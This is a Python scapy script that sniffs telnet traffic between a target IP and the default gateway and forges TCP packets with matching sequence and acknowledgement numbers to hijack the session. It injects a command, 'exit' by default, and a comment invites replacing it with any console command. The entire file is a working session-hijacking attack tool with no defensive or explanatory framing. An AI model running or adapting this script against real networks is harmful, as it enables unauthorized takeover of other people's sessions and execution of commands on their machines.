from scapy.all import *
import subprocess
import sys

cmd0 = "ip route | grep default | awk '{print $3}'"
out = subprocess.Popen(cmd0, shell=True,
           stdout=subprocess.PIPE,
           stderr=subprocess.STDOUT)
#populating gateway and ecoding into utf-8 for Python 3
gateway, stderr = out.communicate()
gateway = gateway.strip()
gateway = gateway.decode("utf-8") 
# ip addres for sniffing
dip = sys.argv[1]
#generally port 23 is used for tcp connections can be changed by user 
#Write GUI to enter port number
port = 23
filter = "host " + dip + " and port " + str(port)

def hijack(p):
     #Prints summary of received packet
     print ("pkt received", p.summary())  
      #If statement to print Seq and Ack of incoming packet
     if p[IP].src == dip and p[IP].dst == gateway:
       print ("Seq: " + str(p[TCP].seq) + " |Ack:" + str(p[TCP].ack))
       print ("Hijck Seq: " + str(p[TCP].ack) + " | Hijack Ack: " + str(p[TCP].seq))
       #populating layers of the frame
       ether = Ether(dst = p[Ether].src, src = p[Ether].dst)
       ip = IP(src=p[IP].dst, dst=p[IP].src, ihl=p[IP].ihl, len=p[IP].len, flags=p[IP].flags, frag=p[IP].frag, ttl=p[IP].ttl, proto=p[IP].proto, id=29321)
       tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq, dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, flags="PA", window=p[TCP].window, options=p[TCP].options)
       #combining layers of the frame then sending with command to be run
       #Write GUI to enter command
       #Enter Console command here hijack = ether/ip/tcp/("command"+"\n")
       hijack = ether/ip/tcp/("exit"+"\n")
       rcv=sendp(hijack)

sniff(count=0, prn = lambda p : hijack(p), filter=filter, lfilter = lambda f : f.haslayer(IP) and f.haslayer(TCP) and f.haslayer(Ether))
